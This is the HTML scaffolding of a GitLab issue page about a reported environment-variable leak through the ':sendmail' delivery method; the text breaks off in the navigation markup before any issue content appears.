





<!DOCTYPE html>
<html class="gl-light ui-neutral with-top-bar with-header " lang="en">
<head prefix="og: http://ogp.me/ns#">
<meta charset="utf-8">
<meta content="IE=edge" http-equiv="X-UA-Compatible">
<meta content="width=device-width, initial-scale=1" name="viewport">
<title>Environment variables can be leaked via the `:sendmail` delivery method (#337601) · Issues · GitLab.org / GitLab · GitLab</title>
<script nonce="LZ20jU6qurgypSVWUREQog==">
//<![CDATA[
window.gon={};gon.api_version="v4";gon.default_avatar_url="https://gitlab.com/assets/no_avatar-849f9c04a3a0d0cea2424ae97b27447dc64a7dbfae83c036c45b403392f0e8ba.png";gon.max_file_size=100;gon.asset_host=null;gon.webpack_public_path="/assets/webpack/";gon.relative_url_root="";gon.user_color_mode="gl-light";gon.user_color_scheme="white";gon.markdown_surround_selection=null;gon.markdown_automatic_lists=null;gon.math_rendering_limits_enabled=true;gon.analytics_url="https://collector.prd-278964.gl-product-analytics.com";gon.analytics_id="715db59f-f350-4bfd-aef8-e7a7f0c023f0";gon.sentry_dsn="https://f5573e26de8f4293b285e556c35dfd6e@new-sentry.gitlab.net/4";gon.sentry_environment="gprd";gon.sentry_clientside_traces_sample_rate=0.05;gon.recaptcha_api_server_url="https://www.recaptcha.net/recaptcha/api.js";gon.recaptcha_sitekey="6LfAERQTAAAAAL4GYSiAMGLbcLyUIBSfPrDNJgeC";gon.gitlab_url="https://gitlab.com";gon.promo_url="https://about.gitlab.com";gon.forum_url="https://forum.gitlab.com";gon.docs_url="https://docs.gitlab.com";gon.revision="6b5ff2da599";gon.feature_category="team_planning";gon.gitlab_logo="/assets/gitlab_logo-2957169c8ef64c58616a1ac3f4fc626e8a35ce4eb3ed31bb0d873712f2a041a0.png";gon.secure=true;gon.sprite_icons="/assets/icons-8791a66659d025e0a4c801978c79a1fbd82db1d27d85f044a35728ea7cf0ae80.svg";gon.sprite_file_icons="/assets/file_icons/file_icons-7cd3d6c3b29a6d972895f36472978a4b5adb4b37f9b5d0716a380e82389f7e0e.svg";gon.emoji_sprites_css_path="/assets/emoji_sprites-bd26211944b9d072037ec97cb138f1a52cd03ef185cd38b8d1fcc963245199a1.css";gon.emoji_backend_version=4;gon.gridstack_css_path="/assets/lazy_bundles/gridstack-5fcfd4ffbea1db04eaf7f16521bcab19ae3af042c8b4afe8d16781eda5a70799.css";gon.test_env=false;gon.disable_animations=null;gon.suggested_label_colors={"#cc338b":"Magenta-pink","#dc143c":"Crimson","#c21e56":"Rose red","#cd5b45":"Dark coral","#ed9121":"Carrot orange","#eee600":"Titanium yellow","#009966":"Green-cyan","#8fbc8f":"Dark sea green","#6699cc":"Blue-gray","#e6e6fa":"Lavender","#9400d3":"Dark violet","#330066":"Deep violet","#36454f":"Charcoal grey","#808080":"Gray"};gon.first_day_of_week=0;gon.time_display_relative=true;gon.time_display_format=0;gon.ee=true;gon.jh=false;gon.dot_com=true;gon.uf_error_prefix="UF";gon.pat_prefix="glpat-";gon.keyboard_shortcuts_enabled=true;gon.diagramsnet_url="https://embed.diagrams.net";gon.features={"sourceEditorToolbar":false,"vscodeWebIde":true,"uiForOrganizations":false,"organizationSwitching":false,"findAndReplace":false,"removeMonitorMetrics":true,"workItemsViewPreference":false,"searchButtonTopRight":false,"duoChatDynamicDimension":false,"advancedContextResolver":true,"preserveMarkdown":false,"issuesGridView":false,"serviceDeskTicket":false,"issuesListDrawer":false,"notificationsTodosButtons":false,"glqlIntegration":true,"workItemsBeta":true,"workItemsAlpha":false,"workItems":true,"epicWidgetEditConfirmation":false,"namespaceLevelWorkItems":false,"okrsMvc":false,"workItemEpics":true};gon.roadmap_epics_limit=1000;gon.subscriptions_url="https://customers.gitlab.com";gon.subscriptions_legacy_sign_in_url="https://customers.gitlab.com/customers/sign_in?legacy=true";gon.billing_accounts_url="https://customers.gitlab.com/billing_accounts";gon.payment_form_url="https://customers.gitlab.com/payment_forms/cc_validation";gon.payment_validation_form_id="payment_method_validation";gon.licensed_features={"escalationPolicies":true,"okrs":true};gon.abilities={"summarizeComments":false,"measureCommentTemperature":false};
//]]>
</script>


<script nonce="LZ20jU6qurgypSVWUREQog==">
//<![CDATA[
var gl = window.gl || {};
gl.startup_calls = {"/gitlab-org/gitlab/-/issues/337601/related_branches":{},"/gitlab-org/gitlab/-/issues/337601/discussions.json?per_page=20":{},"/gitlab-org/gitlab/-/issues/337601.json?serializer=sidebar_extras":{}};
gl.startup_graphql_calls = [{"query":"query getDesignList($fullPath: ID!, $iid: String!, $atVersion: DesignManagementVersionID) {\n  project(fullPath: $fullPath) {\n    __typename\n    id\n    issue(iid: $iid) {\n      __typename\n      id\n      designCollection {\n        __typename\n        copyState\n        designs(atVersion: $atVersion) {\n          __typename\n          nodes {\n            __typename\n            id\n            event\n            filename\n            notesCount\n            image\n            imageV432x230\n            currentUserTodos(state: pending) {\n              __typename\n              nodes {\n                __typename\n                id\n              }\n            }\n          }\n        }\n        versions {\n          __typename\n          nodes {\n            __typename\n            id\n            sha\n            createdAt\n            author {\n              __typename\n              id\n              name\n              avatarUrl\n            }\n          }\n        }\n      }\n    }\n  }\n}\n","variables":{"fullPath":"gitlab-org/gitlab","iid":"337601","atVersion":null}},{"query":"query permissions($fullPath: ID!, $iid: String!) {\n  project(fullPath: $fullPath) {\n    __typename\n    id\n    issue(iid: $iid) {\n      __typename\n      id\n      userPermissions {\n        __typename\n        createDesign\n      }\n    }\n  }\n}\n","variables":{"fullPath":"gitlab-org/gitlab","iid":"337601"}}];

if (gl.startup_calls && window.fetch) {
  Object.keys(gl.startup_calls).forEach(apiCall => {
   gl.startup_calls[apiCall] = {
      fetchCall: fetch(apiCall, {
        // Emulate XHR for Rails AJAX request checks
        headers: {
          'X-Requested-With': 'XMLHttpRequest'
        },
        // fetch won’t send cookies in older browsers, unless you set the credentials init option.
        // We set to `same-origin` which is default value in modern browsers.
        // See https://github.com/whatwg/fetch/pull/585 for more information.
        credentials: 'same-origin'
      })
    };
  });
}
if (gl.startup_graphql_calls && window.fetch) {
  const headers = {"X-CSRF-Token":"nUK5-L6K-Zn-sabsOZwpnsATCG1EA5Y7P7gJLlzhg5j3tl0DAKsTdgyG-H00W4VXlCyaiiV0jEb72GEik9ZutA","x-gitlab-feature-category":"team_planning"};
  const url = `https://gitlab.com/api/graphql`

  const opts = {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      ...headers,
    }
  };

  gl.startup_graphql_calls = gl.startup_graphql_calls.map(call => ({
    ...call,
    fetchCall: fetch(url, {
      ...opts,
      credentials: 'same-origin',
      body: JSON.stringify(call)
    })
  }))
}


//]]>
</script>



<link rel="stylesheet" href="/assets/application-885ad321e4c6048268118763d892168d22a8cfaa28cd45cf320b22faadcbc92a.css" />
<link rel="stylesheet" href="/assets/page_bundles/design_management-f20ae9b5b8c9a0f793e3ffa2ddc13953bfd683e1d351c8e6cc75e0fcd4ddde90.css" /><link rel="stylesheet" href="/assets/page_bundles/incidents-b9f383aefa56f0a72990496e4a4b3aaf2c525843283a1c0c3d85876537187397.css" /><link rel="stylesheet" href="/assets/page_bundles/issuable-e25480d2326300d5c49ad31dbd847a53e39fc33a5fd595a961dd7238e411b558.css" /><link rel="stylesheet" href="/assets/page_bundles/notes_shared-7e727ab1e91b421915feadeb04a1b9d57213cb1b2f8f56f4d894b34d6b42e9b3.css" /><link rel="stylesheet" href="/assets/page_bundles/issues_show-785541c300108b8ecf7c08fd02bd67f4d6b9d59c86918ecfbf91bae5e1c8ffa8.css" /><link rel="stylesheet" href="/assets/page_bundles/work_items-22a76cdd1fe2ae5431b7ff603f86212acaf81b49c4a932f19e3b3222dc1881ee.css" /><link rel="stylesheet" href="/assets/page_bundles/labels-3508460b8d6f839e9d60de1f2065fdaf7f057efab04cf71966acef6a86fe9b41.css" /><link rel="stylesheet" href="/assets/page_bundles/commit_description-1e2cba4dda3c7b30dd84924809020c569f1308dea51520fe1dd5d4ce31403195.css" />
<link rel="stylesheet" href="/assets/application_utilities-58bec0f2dc46133fc9e8548af9854688398e9d7263cc0fd95ec5739f2a069dec.css" />
<link rel="stylesheet" href="/assets/tailwind-25f655cc55079b4f6b973a695ec1b611d85739a1ae3add6b38a953a866603fdc.css" />


<link rel="stylesheet" href="/assets/fonts-fae5d3f79948bd85f18b6513a025f863b19636e85b09a1492907eb4b1bb0557b.css" />
<link rel="stylesheet" href="/assets/highlight/themes/white-e31d355458ead69f8798dbb62f54c60c4ccc7db35289cbbd2353ddfdf5109aac.css" />

<script src="/assets/webpack/runtime.5cb5fe21.bundle.js" defer="defer" nonce="LZ20jU6qurgypSVWUREQog=="></script>
<script src="/assets/webpack/main.d969bdd6.chunk.js" defer="defer" nonce="LZ20jU6qurgypSVWUREQog=="></script>
<script src="/assets/webpack/tracker.493c474d.chunk.js" defer="defer" nonce="LZ20jU6qurgypSVWUREQog=="></script>
<script src="/assets/webpack/analytics.02a84ab3.chunk.js" defer="defer" nonce="LZ20jU6qurgypSVWUREQog=="></script>
<script nonce="LZ20jU6qurgypSVWUREQog==">
//<![CDATA[
window.snowplowOptions = {"namespace":"gl","hostname":"snowplowprd.trx.gitlab.net","cookieDomain":".gitlab.com","appId":"gitlab","formTracking":true,"linkClickTracking":true}

gl = window.gl || {};
gl.snowplowStandardContext = {"schema":"iglu:com.gitlab/gitlab_standard/jsonschema/1-1-1","data":{"environment":"production","source":"gitlab-rails","correlation_id":"01JH2Z23J3935NQ2HK6XYQNZC6","plan":"gold","extra":{},"user_id":null,"global_user_id":null,"is_gitlab_team_member":null,"namespace_id":9970,"project_id":278964,"feature_enabled_by_namespace_ids":null,"realm":"saas","instance_id":"ea8bf810-1d6f-4a6a-b4fd-93e8cbd8b57f","host_name":"gitlab-cny-webservice-web-7666db5c55-4d2mx","instance_version":"17.8.0","context_generated_at":"2025-01-08T12:43:33.569Z"}}
gl.snowplowPseudonymizedPageUrl = "https://gitlab.com/namespace9970/project278964/-/issues/337601";
gl.maskedDefaultReferrerUrl = null;
gl.ga4MeasurementId = 'G-ENFH3X7M5Y';


//]]>
</script>
<link rel="preload" href="/assets/application_utilities-58bec0f2dc46133fc9e8548af9854688398e9d7263cc0fd95ec5739f2a069dec.css" as="style" type="text/css" nonce="pgYZTFXd65eIFMfJrifdGQ==">
<link rel="preload" href="/assets/application-4c530964f03df8970dc59809f0188e4af7f4299c0292f306a4e8920b5b272a83.css" as="style" type="text/css" nonce="pgYZTFXd65eIFMfJrifdGQ==">
<link rel="preload" href="/assets/highlight/themes/white-e31d355458ead69f8798dbb62f54c60c4ccc7db35289cbbd2353ddfdf5109aac.css" as="style" type="text/css" nonce="pgYZTFXd65eIFMfJrifdGQ==">
<link crossorigin="" href="https://snowplowprd.trx.gitlab.net" rel="preconnect">
<link as="font" crossorigin="" href="/assets/gitlab-sans/GitLabSans-1e0a5107ea3bbd4be93e8ad2c503467e43166cd37e4293570b490e0812ede98b.woff2" rel="preload">
<link as="font" crossorigin="" href="/assets/gitlab-sans/GitLabSans-Italic-38eaf1a569a54ab28c58b92a4a8de3afb96b6ebc250cf372003a7b38151848cc.woff2" rel="preload">
<link as="font" crossorigin="" href="/assets/gitlab-mono/GitLabMono-08d2c5e8ff8fd3d2d6ec55bc7713380f8981c35f9d2df14e12b835464d6e8f23.woff2" rel="preload">
<link as="font" crossorigin="" href="/assets/gitlab-mono/GitLabMono-Italic-38e58d8df29485a20c550da1d0111e2c2169f6dcbcf894f2cd3afbdd97bcc588.woff2" rel="preload">
<link rel="preload" href="/assets/fonts-fae5d3f79948bd85f18b6513a025f863b19636e85b09a1492907eb4b1bb0557b.css" as="style" type="text/css" nonce="pgYZTFXd65eIFMfJrifdGQ==">



<script src="/assets/webpack/sentry.b707854c.chunk.js" defer="defer" nonce="LZ20jU6qurgypSVWUREQog=="></script>

<script src="/assets/webpack/9.49e5c3e3.chunk.js" defer="defer" nonce="LZ20jU6qurgypSVWUREQog=="></script>
<script src="/assets/webpack/11.e2e145a2.chunk.js" defer="defer" nonce="LZ20jU6qurgypSVWUREQog=="></script>
<script src="/assets/webpack/13.07e95957.chunk.js" defer="defer" nonce="LZ20jU6qurgypSVWUREQog=="></script>
<script src="/assets/webpack/commons-pages.groups.analytics.dashboards-pages.groups.harbor.repositories-pages.groups.iteration_ca-b07ae190.ba6536d6.chunk.js" defer="defer" nonce="LZ20jU6qurgypSVWUREQog=="></script>
<script src="/assets/webpack/commons-pages.groups.new-pages.import.gitlab_projects.new-pages.import.manifest.new-pages.projects.n-44c6c18e.3be560a5.chunk.js" defer="defer" nonce="LZ20jU6qurgypSVWUREQog=="></script>
<script src="/assets/webpack/commons-pages.search.show-super_sidebar.f7a558c9.chunk.js" defer="defer" nonce="LZ20jU6qurgypSVWUREQog=="></script>
<script src="/assets/webpack/super_sidebar.36f367ce.chunk.js" defer="defer" nonce="LZ20jU6qurgypSVWUREQog=="></script>
<script src="/assets/webpack/commons-pages.projects-pages.projects.activity-pages.projects.alert_management.details-pages.project-bce54798.24ff9b3b.chunk.js" defer="defer" nonce="LZ20jU6qurgypSVWUREQog=="></script>
<script src="/assets/webpack/pages.projects.issues.show.36b1e9b1.chunk.js" defer="defer" nonce="LZ20jU6qurgypSVWUREQog=="></script>

<meta content="object" property="og:type">
<meta content="GitLab" property="og:site_name">
<meta content="Environment variables can be leaked via the `:sendmail` delivery method (#337601) · Issues · GitLab.org / GitLab · GitLab" property="og:title">
<meta content="HackerOne report #1286317 by vakzz on 2021-08-02, assigned to @rshambhuni:..." property="og:description">
<meta content="https://gitlab.com/uploads/-/system/project/avatar/278964/project_avatar.png" property="og:image">
<meta content="64" property="og:image:width">
<meta content="64" property="og:image:height">
<meta content="https://gitlab.com/gitlab-org/gitlab/-/issues/337601" property="og:url">
<meta content="summary" property="twitter:card">
<meta content="Environment variables can be leaked via the `:sendmail` delivery method (#337601) · Issues · GitLab.org / GitLab · GitLab" property="twitter:title">
<meta content="HackerOne report #1286317 by vakzz on 2021-08-02, assigned to @rshambhuni:..." property="twitter:description">
<meta content="https://gitlab.com/uploads/-/system/project/avatar/278964/project_avatar.png" property="twitter:image">
<meta property="twitter:label1" content="Author"><meta property="twitter:data1" content="GitLab SecurityBot"><meta property="twitter:label2" content="Assignee"><meta property="twitter:data2" content="Markus Koller">
<meta name="csrf-param" content="authenticity_token" />
<meta name="csrf-token" content="x3VC37M54LH_jR3ptH8snB0l9z_NbVL26fafpWUuUeetgaYkDRgKXg26Q3i5uIBVSRpl2KwaSIstlvepqhm8yw" />
<meta name="csp-nonce" content="LZ20jU6qurgypSVWUREQog==" />
<meta name="action-cable-url" content="/-/cable" />
<link href="/-/manifest.json" rel="manifest">
<link rel="icon" type="image/png" href="/assets/favicon-yellow-018213ceb87b472388095d0264be5b4319ef47471dacea03c83ecc233ced2fd5.png" id="favicon" data-original-href="/assets/favicon-yellow-018213ceb87b472388095d0264be5b4319ef47471dacea03c83ecc233ced2fd5.png" />
<link rel="apple-touch-icon" type="image/x-icon" href="/assets/apple-touch-icon-b049d4bc0dd9626f31db825d61880737befc7835982586d015bded10b4435460.png" />
<link href="/search/opensearch.xml" rel="search" title="Search GitLab" type="application/opensearchdescription+xml">




<meta content="HackerOne report #1286317 by vakzz on 2021-08-02, assigned to @rshambhuni:..." name="description">
<meta content="#ececef" name="theme-color">
</head>

<body class="tab-width-8 gl-browser-chrome gl-platform-windows" data-group="gitlab-org" data-group-full-path="gitlab-org" data-namespace-id="9970" data-page="projects:issues:show" data-page-type-id="337601" data-project="gitlab" data-project-full-path="gitlab-org/gitlab" data-project-id="278964">
<script nonce="LZ20jU6qurgypSVWUREQog==">
//<![CDATA[
gl = window.gl || {};
gl.GfmAutoComplete = gl.GfmAutoComplete || {};
gl.GfmAutoComplete.dataSources = {"epics":"/gitlab-org/gitlab/-/autocomplete_sources/epics","iterations":"/gitlab-org/gitlab/-/autocomplete_sources/iterations","vulnerabilities":"/gitlab-org/gitlab/-/autocomplete_sources/vulnerabilities","members":"/gitlab-org/gitlab/-/autocomplete_sources/members?type=Issue\u0026type_id=337601","issues":"/gitlab-org/gitlab/-/autocomplete_sources/issues","mergeRequests":"/gitlab-org/gitlab/-/autocomplete_sources/merge_requests","labels":"/gitlab-org/gitlab/-/autocomplete_sources/labels?type=Issue\u0026type_id=337601","milestones":"/gitlab-org/gitlab/-/autocomplete_sources/milestones","commands":"/gitlab-org/gitlab/-/autocomplete_sources/commands?type=Issue\u0026type_id=337601","snippets":"/gitlab-org/gitlab/-/autocomplete_sources/snippets","contacts":"/gitlab-org/gitlab/-/autocomplete_sources/contacts?type=Issue\u0026type_id=337601","wikis":null};


//]]>
</script>
<script nonce="LZ20jU6qurgypSVWUREQog==">
//<![CDATA[
gl = window.gl || {};
gl.client = {"isChrome":true,"isWindows":true};


//]]>
</script>


<header class="header-logged-out" data-testid="navbar">
<a class="gl-sr-only gl-accessibility" href="#content-body">Skip to content</a>
<div class="container-fluid">
<nav aria-label="Explore GitLab" class="header-logged-out-nav gl-flex gl-gap-3 gl-justify-between">
<div class="gl-flex gl-items-center gl-gap-1">
<span class="gl-sr-only">GitLab</span>
<a title="Homepage" id="logo" class="header-logged-out-logo has-tooltip" aria-label="Homepage" data-track-label="main_navigation" data-track-action="click_gitlab_logo_link" data-track-property="navigation_top" href="/"><svg aria-hidden="true" role="img" class="tanuki-logo" width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path class="tanuki-shape tanuki" d="m24.507 9.5-.034-.09L21.082.562a.896.896 0 0 0-1.694.091l-2.29 7.01H7.825L5.535.653a.898.898 0 0 0-1.694-.09L.451 9.411.416 9.5a6.297 6.297 0 0 0 2.09 7.278l.012.01.03.022 5.16 3.867 2.56 1.935 1.554 1.176a1.051 1.051 0 0 0 1.268 0l1.555-1.176 2.56-1.935 5.197-3.89.014-.01A6.297 6.297 0 0 0 24.507 9.5Z"
        fill="#E24329"/>
  <path class="tanuki-shape right-cheek" d="m24.507 9.5-.034-.09a11.44 11.44 0 0 0-4.56 2.051l-7.447 5.632 4.742 3.584 5.197-3.89.014-.01A6.297 6.297 0 0 0 24.507 9.5Z"
        fill="#FC6D26"/>
  <path class="tanuki-shape chin" d="m7.707 20.677 2.56 1.935 1.555 1.176a1.051 1.051 0 0 0 1.268 0l1.555-1.176 2.56-1.935-4.743-3.584-4.755 3.584Z"
        fill="#FCA326"/>
  <path class="tanuki-shape left-cheek" d="M5.01 11.461a11.43 11.43 0 0 0-4.56-2.05L.416 9.5a6.297 6.297 0 0 0 2.09 7.278l.012.01.03.022 5.16 3.867 4.745-3.584-7.444-5.632Z"
        fill="#FC6D26"/>
</svg>

</a><a class="gl-badge badge badge-pill badge-success canary-badge" data-testid="canary_badge_link" href="https://next.gitlab.com" rel="noopener noreferrer" target="_blank"><span class="gl-badge-content">Next
</span></a></div>
<ul class="gl-list-none gl-p-0 gl-m-0 gl-flex gl-gap-3 gl-items-center gl-grow">
<li class="header-logged-out-nav-item header-logged-out-dropdown md:gl-hidden">
<button class="header-logged-out-toggle" data-toggle="dropdown" type="button">
<span class="gl-sr-only">
Menu
</span>
<svg class="s16" data-testid="hamburger-icon"><use href="/assets/icons-8791a66659d025e0a4c801978c79a1fbd82db1d27d85f044a35728ea7cf0ae80.svg#hamburger"></use></svg>
</button>
<div class="dropdown-menu">
<ul>
<li>
<a href="https://about.gitlab.com/why-gitlab">Why GitLab
</a></li>
<li>
<a href="https://about.gitlab.com/pricing">Pricing
</a></li>
<li>
<a href="https://about.gitlab.com/sales">Contact Sales
</a></li>
<li>
<a href="/explore">Explore</a>
</li>
</ul>
</div>
</li>
<li class="header-logged-out-nav-item gl-hidden md:gl-inline-block">
<a href="https://about.gitlab.com/why-gitlab">Why GitLab
</a></li>
<li class="header-logged-out-nav-item gl-hidden md:gl-inline-block">
<a href="https://about.gitlab.com/pricing">Pricing
</a></li>
<li class="header-logged-out-nav-item gl-hidden gl-inline-block">
<a href="https://about.gitlab.com/sales">Contact Sales
</a></li>
<li class="header-logged-out-nav-item gl-hidden md:gl-inline-block">
<a class="" href="/explore">Explore</a>
</li>
</ul>
<ul class="gl-list-none gl-p-0 gl-m-0 gl-flex gl-gap-3 gl-items-center gl-justify-end">
<li class="header-logged-out-nav-item">
<a href="/users/sign_in?redirect_to_referer=yes">Sign in</a>
</li>
<li class="header-logged-out-nav-item">
<a class="gl-button btn btn-md btn-confirm !gl-inline-flex" href="/users/sign_up"><span class="gl-button-text">
Get free trial

</span>

</a></li>
</ul>
</nav>
</div>
</header>

<div class="layout-page page-gutter right-sidebar-expanded page-with-super-sidebar">
<aside class="js-super-sidebar super-sidebar super-sidebar-loading" data-command-palette="{&quot;project_files_url&quot;:&quot;/gitlab-org/gitlab/-/files/master?format=json&quot;,&quot;project_blob_url&quot;:&quot;/gitlab-org/gitlab/-/blob/master&quot;}" data-force-desktop-expanded-sidebar="" data-is-saas="true" data-root-path="/" data-sidebar="{&quot;whats_new_most_recent_release_items_count&quot;:6,&quot;whats_new_version_digest&quot;:&quot;c955dbe1b30a1468b032fe6896086eda50f884ff9559d966e5ef75c34eee3ff0&quot;,&quot;is_logged_in&quot;:false,&quot;context_switcher_links&quot;:[{&quot;title&quot;:&quot;Explore&quot;,&quot;link&quot;:&quot;/explore&quot;,&quot;icon&quot;:&quot;compass&quot;}],&quot;current_menu_items&quot;:[{&quot;id&quot;:&quot;project_overview&quot;,&quot;title&quot;:&quot;GitLab&quot;,&quot;avatar&quot;:&quot;/uploads/-/system/project/avatar/278964/project_avatar.png&quot;,&quot;entity_id&quot;:278964,&quot;link&quot;:&quot;/gitlab-org/gitlab&quot;,&quot;link_classes&quot;:&quot;shortcuts-project&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;manage_menu&quot;,&quot;title&quot;:&quot;Manage&quot;,&quot;icon&quot;:&quot;users&quot;,&quot;avatar_shape&quot;:&quot;rect&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/activity&quot;,&quot;is_active&quot;:false,&quot;items&quot;:[{&quot;id&quot;:&quot;activity&quot;,&quot;title&quot;:&quot;Activity&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/activity&quot;,&quot;link_classes&quot;:&quot;shortcuts-project-activity&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;members&quot;,&quot;title&quot;:&quot;Members&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/project_members&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;labels&quot;,&quot;title&quot;:&quot;Labels&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/labels&quot;,&quot;is_active&quot;:false}],&quot;separated&quot;:false},{&quot;id&quot;:&quot;plan_menu&quot;,&quot;title&quot;:&quot;Plan&quot;,&quot;icon&quot;:&quot;planning&quot;,&quot;avatar_shape&quot;:&quot;rect&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/issues&quot;,&quot;is_active&quot;:true,&quot;items&quot;:[{&quot;id&quot;:&quot;project_issue_list&quot;,&quot;title&quot;:&quot;Issues&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/issues&quot;,&quot;pill_count_field&quot;:&quot;openIssuesCount&quot;,&quot;link_classes&quot;:&quot;shortcuts-issues has-sub-items&quot;,&quot;is_active&quot;:true},{&quot;id&quot;:&quot;boards&quot;,&quot;title&quot;:&quot;Issue boards&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/boards&quot;,&quot;link_classes&quot;:&quot;shortcuts-issue-boards&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;milestones&quot;,&quot;title&quot;:&quot;Milestones&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/milestones&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;iterations&quot;,&quot;title&quot;:&quot;Iterations&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/cadences&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;requirements&quot;,&quot;title&quot;:&quot;Requirements&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/requirements_management/requirements&quot;,&quot;is_active&quot;:false}],&quot;separated&quot;:false},{&quot;id&quot;:&quot;code_menu&quot;,&quot;title&quot;:&quot;Code&quot;,&quot;icon&quot;:&quot;code&quot;,&quot;avatar_shape&quot;:&quot;rect&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/merge_requests&quot;,&quot;is_active&quot;:false,&quot;items&quot;:[{&quot;id&quot;:&quot;project_merge_request_list&quot;,&quot;title&quot;:&quot;Merge requests&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/merge_requests&quot;,&quot;pill_count_field&quot;:&quot;openMergeRequestsCount&quot;,&quot;link_classes&quot;:&quot;shortcuts-merge_requests&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;files&quot;,&quot;title&quot;:&quot;Repository&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/tree/master&quot;,&quot;link_classes&quot;:&quot;shortcuts-tree&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;branches&quot;,&quot;title&quot;:&quot;Branches&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/branches&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;commits&quot;,&quot;title&quot;:&quot;Commits&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/commits/master?ref_type=heads&quot;,&quot;link_classes&quot;:&quot;shortcuts-commits&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;tags&quot;,&quot;title&quot;:&quot;Tags&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/tags&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;graphs&quot;,&quot;title&quot;:&quot;Repository graph&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/network/master?ref_type=heads&quot;,&quot;link_classes&quot;:&quot;shortcuts-network&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;compare&quot;,&quot;title&quot;:&quot;Compare revisions&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/compare?from=master\u0026to=master&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;project_snippets&quot;,&quot;title&quot;:&quot;Snippets&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/snippets&quot;,&quot;link_classes&quot;:&quot;shortcuts-snippets&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;file_locks&quot;,&quot;title&quot;:&quot;Locked files&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/path_locks&quot;,&quot;is_active&quot;:false}],&quot;separated&quot;:false},{&quot;id&quot;:&quot;build_menu&quot;,&quot;title&quot;:&quot;Build&quot;,&quot;icon&quot;:&quot;rocket&quot;,&quot;avatar_shape&quot;:&quot;rect&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/pipelines&quot;,&quot;is_active&quot;:false,&quot;items&quot;:[{&quot;id&quot;:&quot;pipelines&quot;,&quot;title&quot;:&quot;Pipelines&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/pipelines&quot;,&quot;link_classes&quot;:&quot;shortcuts-pipelines&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;jobs&quot;,&quot;title&quot;:&quot;Jobs&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/jobs&quot;,&quot;link_classes&quot;:&quot;shortcuts-builds&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;pipeline_schedules&quot;,&quot;title&quot;:&quot;Pipeline schedules&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/pipeline_schedules&quot;,&quot;link_classes&quot;:&quot;shortcuts-builds&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;test_cases&quot;,&quot;title&quot;:&quot;Test cases&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/quality/test_cases&quot;,&quot;link_classes&quot;:&quot;shortcuts-test-cases&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;artifacts&quot;,&quot;title&quot;:&quot;Artifacts&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/artifacts&quot;,&quot;link_classes&quot;:&quot;shortcuts-builds&quot;,&quot;is_active&quot;:false}],&quot;separated&quot;:false},{&quot;id&quot;:&quot;deploy_menu&quot;,&quot;title&quot;:&quot;Deploy&quot;,&quot;icon&quot;:&quot;deployments&quot;,&quot;avatar_shape&quot;:&quot;rect&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/releases&quot;,&quot;is_active&quot;:false,&quot;items&quot;:[{&quot;id&quot;:&quot;releases&quot;,&quot;title&quot;:&quot;Releases&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/releases&quot;,&quot;link_classes&quot;:&quot;shortcuts-deployments-releases&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;packages_registry&quot;,&quot;title&quot;:&quot;Package Registry&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/packages&quot;,&quot;link_classes&quot;:&quot;shortcuts-container-registry&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;container_registry&quot;,&quot;title&quot;:&quot;Container Registry&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/container_registry&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;model_registry&quot;,&quot;title&quot;:&quot;Model 